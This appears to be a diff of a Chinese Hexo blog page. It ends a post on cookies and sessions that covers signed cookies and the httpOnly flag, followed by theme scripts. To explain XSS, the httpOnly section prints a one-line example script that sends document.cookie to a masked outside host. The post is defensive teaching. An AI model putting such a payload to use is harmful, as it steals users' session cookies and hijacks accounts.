+<h5 id="数据库session"><a href="#数据库session" class="headerlink" title="数据库session"></a>数据库session</h5><p>检索速度较慢</p>
+<h4 id="cookie的安全性"><a href="#cookie的安全性" class="headerlink" title="cookie的安全性"></a>cookie的安全性</h4><h5 id="signedCookie"><a href="#signedCookie" class="headerlink" title="signedCookie"></a>signedCookie</h5><p>如果一个网站用cookie来记录登陆的用户凭证，响应的cookie类似于这样：username=aaa,服务器端根据这个cookie来判定是用户aaa,那在浏览器端把username改为bbb,恰巧真的有bbb这个注册用户，那么就可以进行bbb才能做的操作了。那么类似于用户识别的数据需要存储在cookie中，并且保证不被修改的话可以在服务器端设置一个加密字符串类似于”fuiaosydfoiuyaoisduyf”,然后和username做一个sha1,这样如果cookie在浏览器端被修改，在服务器端就会发现hash校验不一致。</p>
+<h5 id="httpOnly"><a href="#httpOnly" class="headerlink" title="httpOnly"></a>httpOnly</h5><p>http是不会为了下一次连接而维护这次连接所传输的信息的。所以为了在每次会话之间传递信息，就需要用到cookie和session，为了让服务器端获得一个token来检查合法性，很多时候都是在cookie中存储一个sessionID，服务器来识别该用户，那么安全隐患也就引申而出了，只要获得这个cookie，就可以取得别人的身份，特别是管理员等高级权限帐号时，危害就大了，而XSS就是在别人的应用程序中恶意执行一段JS以窃取用户的cookie。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;<span class="built_in">window</span>.open(<span class="string">'http://****?cookie='</span>+<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
+<p>很多时候为了保证cookie的安全,可以给cookie添加HttpOnly这样一个参数，这样cookie在浏览器端就是不可见，不可修改的。对于一些敏感的Cookie我们采用HttpOnly，对于一些需要在应用程序中用JS操作的cookie我们就不予设置，这样就保障了Cookie信息的安全也保证了应用。</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/HTTP/">HTTP</a>
+  </div>
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/2015/12/25/cookie和session必知必会/#disqus_thread" class="comments-count-link">Comments</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+
+</div>
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/css/" title="css">css<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/javascript基础/" title="javascript基础">javascript基础<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/redis/" title="redis">redis<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/前端框架/" title="前端框架">前端框架<sup>1</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/javascript/" title="javascript">javascript<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/redis/" title="redis">redis<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/HTTP/" title="HTTP">HTTP<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/redux/" title="redux">redux<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/nodejs/" title="nodejs">nodejs<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/css居中/" title="css居中">css居中<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://github.com/ColorfulCow" target="_blank" title="github">github</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2017
+		
+		<a href="/about" target="_blank" title="colorfulcow">colorfulcow</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+ </html>
